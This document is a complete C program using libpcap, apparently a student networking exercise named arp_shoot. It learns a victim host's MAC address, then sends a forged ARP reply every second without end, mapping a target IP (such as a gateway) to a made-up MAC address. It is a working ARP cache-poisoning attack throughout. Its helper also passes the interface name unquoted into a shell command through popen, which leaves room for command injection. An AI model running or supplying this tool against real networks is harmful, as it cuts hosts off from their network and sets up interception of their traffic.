#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <string.h>
#include <unistd.h>

#define INFOLEN 256
#define ARP_PACKET_LEN (sizeof(struct ether_header) + sizeof(struct ether_arp))

static char INFO[INFOLEN];

int get_local_ip(const char *name) {
	snprintf(INFO, INFOLEN, "ifconfig %s | grep -Eo \'inet (addr:)?([0-9]+.){3}[0-9]+\' | grep -Eo \'([0-9.]+)\' ", name);
	FILE *fp = popen(INFO, "r");
	if (!fp) return 0;

	fgets(INFO, INFOLEN, fp);
	INFO[strcspn(INFO, "\r\n")] = '\0';
	fclose(fp);
	return 1;
}

int get_local_mac(const char *name) {
	snprintf(INFO, INFOLEN, "/sys/class/net/%s/address", name);
	FILE *fp = fopen(INFO, "r");
  if (!fp) return 0;

	fgets(INFO, INFOLEN, fp);
	INFO[strcspn(INFO, "\r\n")] = '\0';
	fclose(fp);
	return 1;
}

void create_eth_arp(uint8_t *packet, struct ether_addr eth_src, struct ether_addr eth_dst, uint16_t arp_option,
	struct ether_addr arp_hw_src, struct ether_addr arp_hw_dst,struct in_addr arp_ip_src, struct in_addr arp_ip_dst) {
  unsigned int IPV4_LEN = 4;

	struct ether_header *eth = (struct ether_header*)packet;
	memcpy(eth->ether_shost, &eth_src, ETHER_ADDR_LEN);
	memcpy(eth->ether_dhost, &eth_dst, ETHER_ADDR_LEN);
	eth->ether_type = htons(ETHERTYPE_ARP);

	struct ether_arp *arp = (struct ether_arp*)(packet + ETHER_HDR_LEN);
	arp->arp_hrd = htons(ARPHRD_ETHER);
	arp->arp_pro = htons(ETHERTYPE_IP);
	arp->arp_hln = ETHER_ADDR_LEN;
	arp->arp_pln = IPV4_LEN;
	arp->arp_op = htons(arp_option);
	memcpy(arp->arp_sha, &arp_hw_src, ETHER_ADDR_LEN);
	memcpy(arp->arp_tha, &arp_hw_dst, ETHER_ADDR_LEN);
	memcpy(arp->arp_spa, &arp_ip_src, IPV4_LEN);
	memcpy(arp->arp_tpa, &arp_ip_dst, IPV4_LEN);
}

bool sender_replies( const uint8_t *packet, struct in_addr sender_ip, struct ether_addr *sender_mac) {
	const struct ether_header *eth = (const struct ether_header*)packet;
	if (ntohs(eth->ether_type) != ETHERTYPE_ARP) return false;

	const struct ether_arp* arp = (const struct ether_arp*)(packet + ETHER_HDR_LEN);
	if (ntohs(arp->arp_op) != ARPOP_REPLY) return false;

	if (*(uint32_t* )&arp->arp_spa != *(uint32_t* )&sender_ip) return false;

	memcpy(sender_mac,arp->arp_sha, ETHER_ADDR_LEN);
	return true;
}

void usage() {
	printf("Usage: arp_shoot <interface> <send_ip> <target_ip>\n");
	printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }

  const char *dev   = argv[1];
	const char *sender_ip   = argv[2];
  const char *target_ip = argv[3];

  static char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  struct in_addr local_ip_addr, sender_ip_addr, target_ip_addr;
	struct ether_addr local_mac_addr, sender_mac_addr, allf, all0;

  if(get_local_ip(dev)!=1){
    printf("Can't find local IP\n");
    return -1;
  }
  printf("Local IP: %s\n",INFO);

  if(inet_pton(AF_INET, INFO, &local_ip_addr)!=1){
    printf("Local IP error: %s\n",INFO);
    return -1;
  }
  
  if(inet_pton(AF_INET,sender_ip,&sender_ip_addr)!=1){
    printf("Sender IP error: %s\n",sender_ip);
    return -1;
  }

  if(inet_pton(AF_INET,target_ip,&target_ip_addr)!=1){
    printf("Target IP error: %s\n",target_ip);
    return -1;
  }

  if(get_local_mac(dev)!=1){
    printf("Local MAC error: %s\n",INFO);
    return -1;
  }
  printf("Local MAC: %s\n",INFO);
  ether_aton_r(INFO,&local_mac_addr);

  ether_aton_r("ff:ff:ff:ff:ff:ff", &allf);
  ether_aton_r("00:00:00:00:00:00", &all0);

  static uint8_t arp_packet[ARP_PACKET_LEN];
  create_eth_arp(arp_packet,
    local_mac_addr, allf,
		ARPOP_REQUEST,
		local_mac_addr, all0,
		local_ip_addr, sender_ip_addr);
  
  if(pcap_inject(handle,arp_packet,ARP_PACKET_LEN)==-1){
    printf("Can't send ARP request\n");
    return -1;
  }
  printf("Send ARP request\n");

  while (true) {
    struct pcap_pkthdr* header;
    const uint8_t *packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    if (sender_replies(packet, sender_ip_addr, &sender_mac_addr)) break;
  }
  ether_ntoa_r(&sender_mac_addr, INFO);
  printf("Sender MAC: %s\n", INFO);
  
  struct ether_addr fake_target_mac_addr;
  ether_aton_r("12:34:56:78:90:12",&fake_target_mac_addr);//마음대로 가능

  create_eth_arp(arp_packet,
		fake_target_mac_addr, sender_mac_addr,
		ARPOP_REPLY,
		fake_target_mac_addr, sender_mac_addr,
		target_ip_addr, sender_ip_addr);

  while(true){
		if (pcap_inject(handle, arp_packet, ARP_PACKET_LEN)== -1){
      printf("Can't send ARP reply\n");
      return -1;
    }

		printf("Send ARP reply!\n");
    sleep(1);
  }

  pcap_close(handle);
  return 0;
}
